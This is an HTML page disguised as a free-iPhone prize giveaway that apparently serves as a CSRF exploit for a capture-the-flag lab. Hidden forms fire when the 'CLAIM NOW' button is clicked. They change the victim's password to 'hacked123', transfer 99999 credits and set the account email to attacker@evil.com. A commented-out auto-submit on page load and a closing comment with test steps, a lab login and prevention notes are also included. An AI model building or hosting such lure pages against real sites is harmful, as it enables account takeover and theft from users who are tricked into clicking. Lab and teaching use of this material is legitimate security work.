<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win a FREE iPhone!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            color: white;
        }

        .container {
            background: white;
            color: #333;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }

        h1 {
            color: #667eea;
            font-size: 28px;
        }

        .emoji {
            font-size: 60px;
            margin: 20px 0;
        }

        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 30px;
            cursor: pointer;
            margin-top: 20px;
        }

        .btn:hover {
            transform: scale(1.05);
        }

        .small {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="emoji">ðŸŽ‰ðŸ“±</div>
        <h1>Congratulations!</h1>
        <p>You've been selected to win a <strong>FREE iPhone 15 Pro!</strong></p>
        <p>Click the button below to claim your prize!</p>

        <button class="btn" onclick="claimPrize()">CLAIM NOW!</button>

        <p class="small">*Terms and conditions apply</p>
    </div>

    <!-- Hidden CSRF Attack Forms -->

    <!-- Attack 1: Change victim's password -->
    <iframe name="csrf_frame1" style="display:none;"></iframe>
    <form id="changePassword" method="POST" action="http://localhost:8080/profile.php" target="csrf_frame1"
        style="display:none;">
        <input type="hidden" name="new_password" value="hacked123">
    </form>

    <!-- Attack 2: Transfer all credits to attacker -->
    <iframe name="csrf_frame2" style="display:none;"></iframe>
    <form id="stealCredits" method="POST" action="http://localhost:8080/profile.php" target="csrf_frame2"
        style="display:none;">
        <input type="hidden" name="transfer_to" value="admin">
        <input type="hidden" name="transfer_amount" value="99999">
    </form>

    <!-- Attack 3: Change email (for account recovery takeover) -->
    <iframe name="csrf_frame3" style="display:none;"></iframe>
    <form id="changeEmail" method="POST" action="http://localhost:8080/profile.php" target="csrf_frame3"
        style="display:none;">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>

    <script>
        function claimPrize() {
            // Submit all CSRF attacks
            document.getElementById('changePassword').submit();
            setTimeout(function () {
                document.getElementById('stealCredits').submit();
            }, 500);
            setTimeout(function () {
                document.getElementById('changeEmail').submit();
            }, 1000);

            // Show fake success message
            setTimeout(function () {
                alert('ðŸŽ‰ Your prize is being processed! Check your email!');
            }, 1500);
        }

        // Auto-submit on page load (more stealthy attack)
        // window.onload = function() {
        //     document.getElementById('changePassword').submit();
        // };
    </script>
</body>

</html>

<!--
    CSRF Exploit Page for CTF
    
    This is an example malicious page that an attacker would host.
    When a victim visits this page while logged into the vulnerable site,
    the hidden forms are automatically submitted using the victim's session.
    
    Attack scenarios:
    1. Password Change - Victim's password is changed to "hacked123"
    2. Credit Theft - All credits transferred to attacker's account
    3. Email Change - Account recovery email changed to attacker's email
    
    To test:
    1. Login to the vulnerable site as "john" (password: password123)
    2. Open this page in another tab
    3. Click the button (or modify to auto-submit)
    4. Check if password/credits/email were changed
    
    Prevention: Implement CSRF tokens, SameSite cookies, Origin header validation
-->